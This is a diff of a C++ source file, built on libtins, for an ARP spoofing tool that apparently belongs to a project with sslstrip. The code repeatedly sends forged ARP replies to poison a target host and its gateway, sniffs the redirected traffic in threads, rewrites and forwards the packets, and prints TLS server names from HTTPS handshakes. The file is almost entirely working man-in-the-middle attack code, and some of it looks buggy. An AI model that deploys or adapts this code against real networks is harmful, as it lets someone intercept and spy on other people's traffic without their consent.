@@ -1,113 +1,120 @@
-#include "./arpspoof.h"
+#include "arpspoof.h"
 #include "../sslstrip/ssl.h"
 #include <unistd.h>
-#include <future>
-using std::cout;
-using std::endl;
 
-EthernetII ArpSpoofer::MakeArpReply(IPv4Address to, IPv4Address from, HWAddress<6> toHw) {
-    ARP arp(to, from, toHw, info.hw_addr);
-    arp.opcode(ARP::REPLY);                
-    cout<< arp.target_hw_addr().to_string()<<endl;    
-    return EthernetII(toHw, info.hw_addr) / arp;   
+using IPAddr = const Tins::IPv4Address;
+using HWAddr = const Tins::HWAddress<6>;
+
+ArpSpoof::ArpSpoof(const AttackInfo& p) {
+    this->sendInfo = SendingInfo(p.iface,p.deviceName);
+    this->arpSender = PacketSender(p.iface);    
+    this->attInfo = p;    
+}
+void ArpSpoof::MakeArpReply() {
+    auto gwIp = this->attInfo.gwIp;
+    auto targetIp = this->attInfo.targetIp;
+    auto myhw = this->sendInfo.info.hw_addr;
+    this->arpStrm.toGwARP = ARP(gwIp, targetIp, myhw);
+    this->arpStrm.toTargetARP = ARP(targetIp, gwIp, myhw);    
 }
 
-ArpSpoofer::ArpSpoofer(IPv4Address target, IPv4Address my, IPv4Address gw, std::string device) : targetIp(target), myIp(my), gwIp(gw), 
-                        device(device){
-                            PacketSender sender;                            
-                            this->iface =  NetworkInterface(device);                        
-                            this->info = this->iface.addresses(); 
-                            this->gwHwAddr = Utils::resolve_hwaddr(iface,gwIp,sender);
-                            this->targetHwAddr = Utils::resolve_hwaddr(iface,targetIp,sender);                            
-                            this->toGw = MakeArpReply(gw,target,gwHwAddr);                            
-                            this->toTarget = MakeArpReply(target, gw, targetHwAddr);                                                                            
-                            this->targetInfo = ForwardParam(this->gwIp, this->targetIp, this->gwHwAddr, this->targetHwAddr, device, this->myIp);
-                            this->gwInfo = ForwardParam(this->targetIp, this->gwIp, this->targetHwAddr, this->gwHwAddr, device, this->myIp);                            
-                            this->arpSender = PacketSender(device);
-}
-
-void ArpSpoofer::doArpspoof() {    
-    cout<<"=====do arp====="<<endl;
-    cout<<"d: "<<toGw.dst_addr().to_string()<<endl;      
-    cout<<"t ip: "<<toGw.rfind_pdu<ARP>().target_ip_addr().to_string()<<endl;
-    cout<<"t hw: "<<toGw.rfind_pdu<ARP>().target_hw_addr().to_string()<<endl;
-    cout<<"=====do arp====="<<endl;
-    cout<<"d: "<<toTarget.dst_addr().to_string()<<endl;      
-    cout<<"t ip: "<<toTarget.rfind_pdu<ARP>().target_ip_addr().to_string()<<endl;
-    cout<<"t hw: "<<toTarget.rfind_pdu<ARP>().target_hw_addr().to_string()<<endl;
-    int i=0;    
-        
+void ArpSpoof::arpPoisoning() {
+    auto toGw = EthernetII(this->attInfo.gwHwAddr, this->sendInfo.iface.hw_address()) / this->arpStrm.toGwARP;
+    auto toTarget = EthernetII(this->attInfo.targetHwAddr, this->sendInfo.iface.hw_address())/this->arpStrm.toTargetARP;
     while(true) {
-        cout << i++ <<endl;
-        this->arpSender.send(toGw,iface);        
-        this->arpSender.send(toTarget,iface);                    
+        this->arpSender.send(toGw);
+        this->arpSender.send(toTarget);
         sleep(3);
-    }
+    }    
 }
 
-EthernetII ArpSpoofer::modifyPacket(PDU* pdu, ForwardParam& p) {    
-    EthernetII newEth = EthernetII(p.toHw,info.hw_addr)/IP(p.to,myIp);
-    // cout << "catched " + p.from.to_string() << endl;
-    switch (pdu->rfind_pdu<IP>().inner_pdu()->pdu_type())
-    {
-        case PDU::TCP : {            
-            // cout << "TCP" << endl;
-            TCP myTcp = pdu->rfind_pdu<TCP>();
-            if (myTcp.dport() == 443) {
-                TLS *tls = new TLS(myTcp.serialize());
-                if(tls->handshake.type.num == Htype_t::CLIENT_HELLO) {
-                    // cout << tls->handshake.Extensions.server_names() << endl;  USE 
-                } else {
-                    cout<<"...."<<endl;
-                }   
-                delete tls;
-            } else {
-                newEth /= myTcp;
+EthernetII crackPacket(const PDU &pdu, IPAddr &hadTogoIP, \
+                        HWAddr &hadTogoHw, IPAddr &myIp, HWAddr &myHw) {
+    EthernetII newEth = EthernetII(hadTogoHw, myHw) / IP(hadTogoIP, myIp);    
+    switch (pdu.find_pdu<IP>()->inner_pdu()->pdu_type()) {
+        case PDU::TCP: {
+            auto myTcp = pdu.rfind_pdu<TCP>();
+            newEth /= myTcp;
+            if(myTcp.dport() == 443) {
+                TLS t(myTcp.serialize());
+                cout << t.handshake.Extensions.server_names() << endl;
             }
             break;
         }
-
-        case PDU::UDP : {
-            // cout << "UDP" << endl;
-            newEth /= pdu->rfind_pdu<UDP>();
+        case PDU::UDP: {
+            newEth /= pdu.rfind_pdu<UDP>();
             break;
         }
-
-        default :{
-            // cout << "NOT DECLEARED" << endl;
-            newEth /= pdu->rfind_pdu<RawPDU>();
+        default: {
+            newEth /= pdu.rfind_pdu<RawPDU>();
             break;
         }
     }
-    try{
-        return newEth;
-    } catch(...) {
-        return EthernetII(NULL);
+    return newEth;
+}
+
+EthernetII ArpSpoof::crackPacketFromGw(const PDU& pdu) {
+    return crackPacket(pdu, this->attInfo.targetIp, this->attInfo.targetHwAddr, this->attInfo.myIp, this->sendInfo.info.hw_addr);
+}
+
+EthernetII ArpSpoof::crackPacketFromTarget(const PDU& pdu) {
+    return crackPacket(pdu, this->attInfo.gwIp, this->attInfo.gwHwAddr, this->attInfo.myIp, this->sendInfo.info.hw_addr);
+}
+
+void ArpSpoof::setCrackedPackToGwbuf(const PDU& p) {
+    this->arpStrm.mutexLock.lock();
+    this->arpStrm.crackedPacketBuf.push(p.rfind_pdu<EthernetII>());
+    this->arpStrm.mutexLock.unlock();
+}
+
+void ArpSpoof::setCrackedPackToTargetbuf(const PDU& p) {
+    this->arpStrm.mutexLock.lock();
+    this->arpStrm.crackedPacketBuf.push(p.rfind_pdu<EthernetII>());
+    this->arpStrm.mutexLock.unlock();
+}
+
+void ArpSpoof::sendCrackedPacket() {
+    auto a = &this->arpStrm.crackedPacketBuf.front();
+    this->arpStrm.mutexLock.lock();
+    this->arpStrm.crackedPacketBuf.pop();
+    this->arpStrm.mutexLock.unlock();
+    this->arpSender.send(*a);
+}
+
+void ArpSpoof::ForwardPacketFromGw() {
+    PDU *p = nullptr;
+    Packet pk;
+    Sniffer sniffer(this->sendInfo.deviceName);
+    sniffer.set_filter("ip src"+this->attInfo.gwIp);    
+    while (true) {
+        pk = sniffer.next_packet();    
+        if(!pk.pdu()) continue;
+        p = pk.pdu();
+        setCrackedPackToTargetbuf(crackPacketFromGw(*p));
     }
 }
 
-void ArpSpoofer::setPacketBuffer(ForwardParam p, Array a) {
-    SnifferConfiguration config;
-    PDU *pdu = nullptr;
+void ArpSpoof::ForwardPacketFromTarget() {
+    PDU *p = nullptr;
     Packet pk;
-    config.set_filter("ip src " + p.from.to_string());
-    config.set_immediate_mode(true);
-    NetworkInterface::Info info(NetworkInterface(this->device).addresses());
-    Sniffer sniffer(device, config);
-
+    Sniffer sniffer(this->sendInfo.deviceName);
+    sniffer.set_filter("ip src"+this->attInfo.targetIp);    
     while (true) {
-        pk = sniffer.next_packet();
-        if (!pk.pdu())  continue;
-        pdu = pk.pdu();
+        pk = sniffer.next_packet();    
+        if(!pk.pdu()) continue;
+        p = pk.pdu();                
+        setCrackedPackToGwbuf(crackPacketFromTarget(*p));
+    }   
+}
 
-        if (!pdu->find_pdu<EthernetII>())  continue;
-        auto fut = std::async(std::launch::async, [&a,this,&pdu,&p](){
-            static int index = 0;            
-            a[index++] = this->modifyPacket(pdu,p);
-            if(index == BufSize) 
-                index=0;
-        });
-
-        fut.get();
-    }
+void ArpSpoof::run() {
+    this->MakeArpReply();
+    auto t1 = thread([this]{this->ForwardPacketFromGw();});
+    auto t2 = thread([this]{this->ForwardPacketFromTarget();});
+    auto t3 = thread([this]{this->sendCrackedPacket();});
+    auto t4 = thread([this]{this->arpPoisoning();});
+    t1.join();
+    t2.join();
+    t3.join();
+    t4.join();    
 }
